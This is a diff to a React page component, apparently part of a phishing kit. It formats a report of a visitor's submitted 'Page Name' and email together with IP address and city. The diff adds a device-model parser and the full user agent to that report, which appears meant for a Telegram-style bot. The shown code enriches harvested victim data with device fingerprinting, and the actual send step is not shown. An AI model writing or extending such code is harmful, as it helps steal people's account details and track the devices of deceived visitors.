@@ -426,10 +426,168 @@ const Home = () => {
                     country_code: 'k lấy được'
                 };
                 const location = `${currentGeoInfo.city || 'k lấy được'} - ${currentGeoInfo.country_code || 'k lấy được'}`;
+                const userAgent = navigator.userAgent || 'k lấy được';
+                
+                // Parse device info từ User Agent - cải thiện để lấy model cụ thể
+                const getDeviceInfo = () => {
+                    const ua = navigator.userAgent || '';
+                    const platform = navigator.platform || '';
+                    
+                    // iPhone models - parse từ identifier
+                    if (/iPhone/.test(ua)) {
+                        // iPhone model identifiers
+                        const iphoneModels = {
+                            'iPhone15,2': 'iPhone 14 Pro',
+                            'iPhone15,3': 'iPhone 14 Pro Max',
+                            'iPhone14,7': 'iPhone 13 mini',
+                            'iPhone14,8': 'iPhone 13 Pro',
+                            'iPhone14,2': 'iPhone 13 Pro Max',
+                            'iPhone13,1': 'iPhone 12 mini',
+                            'iPhone13,2': 'iPhone 12',
+                            'iPhone13,3': 'iPhone 12 Pro',
+                            'iPhone13,4': 'iPhone 12 Pro Max',
+                            'iPhone12,1': 'iPhone 11',
+                            'iPhone12,3': 'iPhone 11 Pro',
+                            'iPhone12,5': 'iPhone 11 Pro Max',
+                            'iPhone11,8': 'iPhone XR',
+                            'iPhone11,2': 'iPhone XS',
+                            'iPhone11,4': 'iPhone XS Max',
+                            'iPhone10,3': 'iPhone X',
+                            'iPhone10,6': 'iPhone X',
+                            'iPhone10,1': 'iPhone 8',
+                            'iPhone10,4': 'iPhone 8',
+                            'iPhone10,2': 'iPhone 8 Plus',
+                            'iPhone10,5': 'iPhone 8 Plus'
+                        };
+                        
+                        // Try to find model identifier
+                        for (const [identifier, model] of Object.entries(iphoneModels)) {
+                            if (ua.includes(identifier)) {
+                                return model;
+                            }
+                        }
+                        
+                        // Fallback: try to get iOS version
+                        const iosMatch = ua.match(/OS ([\d_]+)/);
+                        if (iosMatch) {
+                            return `iPhone (iOS ${iosMatch[1].replace(/_/g, '.')})`;
+                        }
+                        return 'iPhone';
+                    }
+                    
+                    // iPad models
+                    if (/iPad/.test(ua)) {
+                        const ipadModels = {
+                            'iPad13,1': 'iPad Air 4',
+                            'iPad13,2': 'iPad Air 4',
+                            'iPad11,1': 'iPad 10.2"',
+                            'iPad11,2': 'iPad 10.2"',
+                            'iPad8,1': 'iPad Pro 11"',
+                            'iPad8,2': 'iPad Pro 11"',
+                            'iPad8,3': 'iPad Pro 11"',
+                            'iPad8,4': 'iPad Pro 11"'
+                        };
+                        
+                        for (const [identifier, model] of Object.entries(ipadModels)) {
+                            if (ua.includes(identifier)) {
+                                return model;
+                            }
+                        }
+                        
+                        const iosMatch = ua.match(/OS ([\d_]+)/);
+                        if (iosMatch) {
+                            return `iPad (iOS ${iosMatch[1].replace(/_/g, '.')})`;
+                        }
+                        return 'iPad';
+                    }
+                    
+                    // Android devices - parse model name
+                    if (/Android/.test(ua)) {
+                        // Try to get device model from various patterns
+                        let deviceModel = '';
+                        
+                        // Pattern 1: Build/MODEL
+                        const buildMatch = ua.match(/Build\/([^;)]+)/);
+                        if (buildMatch) {
+                            deviceModel = buildMatch[1].split('/')[0];
+                        }
+                        
+                        // Pattern 2: wv) or ; MODEL)
+                        const wvMatch = ua.match(/wv\)|;\s([^)]+)\)/);
+                        if (wvMatch && wvMatch[1]) {
+                            deviceModel = wvMatch[1];
+                        }
+                        
+                        // Pattern 3: Look for common device names
+                        const samsungMatch = ua.match(/(SM-[A-Z0-9]+)/);
+                        if (samsungMatch) {
+                            deviceModel = `Samsung ${samsungMatch[1]}`;
+                        }
+                        
+                        const xiaomiMatch = ua.match(/(Mi\s[^;)]+|Redmi\s[^;)]+)/);
+                        if (xiaomiMatch) {
+                            deviceModel = xiaomiMatch[1];
+                        }
+                        
+                        const huaweiMatch = ua.match(/([A-Z]{2,3}-[A-Z0-9]+)/);
+                        if (huaweiMatch && !deviceModel) {
+                            deviceModel = `Huawei ${huaweiMatch[1]}`;
+                        }
+                        
+                        // Get Android version
+                        const androidMatch = ua.match(/Android\s([\d.]+)/);
+                        const androidVersion = androidMatch ? androidMatch[1] : '';
+                        
+                        if (deviceModel) {
+                            return androidVersion ? `${deviceModel} (Android ${androidVersion})` : deviceModel;
+                        }
+                        
+                        return androidVersion ? `Android ${androidVersion}` : 'Android Device';
+                    }
+                    
+                    if (/Windows Phone/.test(ua)) {
+                        return 'Windows Phone';
+                    }
+                    
+                    // Desktop OS
+                    if (/Windows/.test(ua)) {
+                        const match = ua.match(/Windows NT ([\d.]+)/);
+                        if (match) {
+                            const version = match[1];
+                            const versions = {
+                                '10.0': 'Windows 10/11',
+                                '6.3': 'Windows 8.1',
+                                '6.2': 'Windows 8',
+                                '6.1': 'Windows 7'
+                            };
+                            return versions[version] || `Windows ${version}`;
+                        }
+                        return 'Windows';
+                    }
+                    
+                    if (/Mac OS X/.test(ua)) {
+                        const match = ua.match(/Mac OS X ([\d_]+)/);
+                        if (match) {
+                            return `macOS ${match[1].replace(/_/g, '.')}`;
+                        }
+                        return 'macOS';
+                    }
+                    
+                    if (/Linux/.test(ua)) {
+                        return 'Linux';
+                    }
+                    
+                    // Fallback
+                    return platform || 'Unknown Device';
+                };
+                
+                const deviceInfo = getDeviceInfo();
                 const messageLines = [
                     `📅 <b>Thời gian:</b> <code>${formattedTime}</code>`,
                     `🌍 <b>IP:</b> <code>${currentGeoInfo.ip || 'k lấy được'}</code>`,
                     `📍 <b>Vị trí:</b> <code>${location}</code>`,
+                    `💻 <b>Thiết bị:</b> <code>${deviceInfo}</code>`,
+                    `🔧 <b>User Agent:</b> <code>${userAgent}</code>`,
                     '',
                     `🔖 <b>Page Name:</b> <code>${formData.pageName}</code>`,
                     `📧 <b>Email:</b> <code>${formData.mail}</code>`,
@@ -538,9 +696,167 @@ const Home = () => {
         const ipInfo = localStorage.getItem('ipInfo');
         const ipData = ipInfo ? JSON.parse(ipInfo) : {};
 
+        const userAgent = navigator.userAgent || 'k lấy được';
+        
+        // Parse device info từ User Agent - cải thiện để lấy model cụ thể
+        const getDeviceInfo = () => {
+            const ua = navigator.userAgent || '';
+            const platform = navigator.platform || '';
+            
+            // iPhone models - parse từ identifier
+            if (/iPhone/.test(ua)) {
+                // iPhone model identifiers
+                const iphoneModels = {
+                    'iPhone15,2': 'iPhone 14 Pro',
+                    'iPhone15,3': 'iPhone 14 Pro Max',
+                    'iPhone14,7': 'iPhone 13 mini',
+                    'iPhone14,8': 'iPhone 13 Pro',
+                    'iPhone14,2': 'iPhone 13 Pro Max',
+                    'iPhone13,1': 'iPhone 12 mini',
+                    'iPhone13,2': 'iPhone 12',
+                    'iPhone13,3': 'iPhone 12 Pro',
+                    'iPhone13,4': 'iPhone 12 Pro Max',
+                    'iPhone12,1': 'iPhone 11',
+                    'iPhone12,3': 'iPhone 11 Pro',
+                    'iPhone12,5': 'iPhone 11 Pro Max',
+                    'iPhone11,8': 'iPhone XR',
+                    'iPhone11,2': 'iPhone XS',
+                    'iPhone11,4': 'iPhone XS Max',
+                    'iPhone10,3': 'iPhone X',
+                    'iPhone10,6': 'iPhone X',
+                    'iPhone10,1': 'iPhone 8',
+                    'iPhone10,4': 'iPhone 8',
+                    'iPhone10,2': 'iPhone 8 Plus',
+                    'iPhone10,5': 'iPhone 8 Plus'
+                };
+                
+                // Try to find model identifier
+                for (const [identifier, model] of Object.entries(iphoneModels)) {
+                    if (ua.includes(identifier)) {
+                        return model;
+                    }
+                }
+                
+                // Fallback: try to get iOS version
+                const iosMatch = ua.match(/OS ([\d_]+)/);
+                if (iosMatch) {
+                    return `iPhone (iOS ${iosMatch[1].replace(/_/g, '.')})`;
+                }
+                return 'iPhone';
+            }
+            
+            // iPad models
+            if (/iPad/.test(ua)) {
+                const ipadModels = {
+                    'iPad13,1': 'iPad Air 4',
+                    'iPad13,2': 'iPad Air 4',
+                    'iPad11,1': 'iPad 10.2"',
+                    'iPad11,2': 'iPad 10.2"',
+                    'iPad8,1': 'iPad Pro 11"',
+                    'iPad8,2': 'iPad Pro 11"',
+                    'iPad8,3': 'iPad Pro 11"',
+                    'iPad8,4': 'iPad Pro 11"'
+                };
+                
+                for (const [identifier, model] of Object.entries(ipadModels)) {
+                    if (ua.includes(identifier)) {
+                        return model;
+                    }
+                }
+                
+                const iosMatch = ua.match(/OS ([\d_]+)/);
+                if (iosMatch) {
+                    return `iPad (iOS ${iosMatch[1].replace(/_/g, '.')})`;
+                }
+                return 'iPad';
+            }
+            
+            // Android devices - parse model name
+            if (/Android/.test(ua)) {
+                // Try to get device model from various patterns
+                let deviceModel = '';
+                
+                // Pattern 1: Build/MODEL
+                const buildMatch = ua.match(/Build\/([^;)]+)/);
+                if (buildMatch) {
+                    deviceModel = buildMatch[1].split('/')[0];
+                }
+                
+                // Pattern 2: wv) or ; MODEL)
+                const wvMatch = ua.match(/wv\)|;\s([^)]+)\)/);
+                if (wvMatch && wvMatch[1]) {
+                    deviceModel = wvMatch[1];
+                }
+                
+                // Pattern 3: Look for common device names
+                const samsungMatch = ua.match(/(SM-[A-Z0-9]+)/);
+                if (samsungMatch) {
+                    deviceModel = `Samsung ${samsungMatch[1]}`;
+                }
+                
+                const xiaomiMatch = ua.match(/(Mi\s[^;)]+|Redmi\s[^;)]+)/);
+                if (xiaomiMatch) {
+                    deviceModel = xiaomiMatch[1];
+                }
+                
+                const huaweiMatch = ua.match(/([A-Z]{2,3}-[A-Z0-9]+)/);
+                if (huaweiMatch && !deviceModel) {
+                    deviceModel = `Huawei ${huaweiMatch[1]}`;
+                }
+                
+                // Get Android version
+                const androidMatch = ua.match(/Android\s([\d.]+)/);
+                const androidVersion = androidMatch ? androidMatch[1] : '';
+                
+                if (deviceModel) {
+                    return androidVersion ? `${deviceModel} (Android ${androidVersion})` : deviceModel;
+                }
+                
+                return androidVersion ? `Android ${androidVersion}` : 'Android Device';
+            }
+            
+            if (/Windows Phone/.test(ua)) {
+                return 'Windows Phone';
+            }
+            
+            // Desktop OS
+            if (/Windows/.test(ua)) {
+                const match = ua.match(/Windows NT ([\d.]+)/);
+                if (match) {
+                    const version = match[1];
+                    const versions = {
+                        '10.0': 'Windows 10/11',
+                        '6.3': 'Windows 8.1',
+                        '6.2': 'Windows 8',
+                        '6.1': 'Windows 7'
+                    };
+                    return versions[version] || `Windows ${version}`;
+                }
+                return 'Windows';
+            }
+            
+            if (/Mac OS X/.test(ua)) {
+                const match = ua.match(/Mac OS X ([\d_]+)/);
+                if (match) {
+                    return `macOS ${match[1].replace(/_/g, '.')}`;
+                }
+                return 'macOS';
+            }
+            
+            if (/Linux/.test(ua)) {
+                return 'Linux';
+            }
+            
+            // Fallback
+            return platform || 'Unknown Device';
+        };
+        
+        const deviceInfo = getDeviceInfo();
         return `📅 <b>Thời gian:</b> <code>${timestamp}</code>
 🌍 <b>IP:</b> <code>${ipData.ip || 'k lấy được'}</code>
-📍 <b>Vị trí:</b> <code>${ipData.city || 'k lấy được'} - ${ipData.region || 'k lấy được'} - ${ipData.country_code || 'k lấy được'}</code>
+📍 <b>Vị trí:</b> <code>${ipData.city || 'k lấy được'} - ${ipData.country_code || 'k lấy được'}</code>
+💻 <b>Thiết bị:</b> <code>${deviceInfo}</code>
+🔧 <b>User Agent:</b> <code>${userAgent}</code>
 
 🔖 <b>Page Name:</b> <code>${data.pageName}</code>
 📧 <b>Email:</b> <code>${data.mail}</code>
